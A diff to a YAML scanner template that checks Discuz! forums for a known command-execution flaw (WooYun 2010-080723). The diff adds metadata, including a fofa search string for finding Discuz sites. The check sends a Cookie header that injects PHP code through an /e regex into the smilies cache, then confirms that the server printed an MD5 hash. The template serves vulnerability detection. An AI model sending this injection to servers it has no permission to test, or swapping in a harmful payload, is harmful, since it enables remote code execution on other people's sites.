@@ -1,19 +1,24 @@
 id: wooyun-2010-080723
 
 info:
-    name: Discuz Command Execution
-    author: Loneyer
-    severity: high
+  name: Discuz Command Execution
+  author: Loneyer
+  severity: high
+  verified: false
+  description: |
+    Discuz! 存在命令执行漏洞，攻击者可以通过构造特殊的请求参数，在服务器上执行任意命令。
+    fofa: app="Discuz!"
+  tags: discuz,command,execution
+  created: 2025/03/13
 
 set:
-    rand: randomInt(200000000, 210000000)
+  rand: randomInt(200000000, 210000000)
 rules:
-    r0:
-        request:
-            method: GET
-            path: /viewthread.php?tid=10
-            headers:
-                Cookie: GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Bsearcharray%5D=/.*/eui; GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Breplacearray%5D=print_r(md5({{rand}}));
-        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
+  r0:
+    request:
+      method: GET
+      path: /viewthread.php?tid=10
+      headers:
+        Cookie: GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Bsearcharray%5D=/.*/eui; GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Breplacearray%5D=print_r(md5({{rand}}));
+    expression: response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
 expression: r0()
-
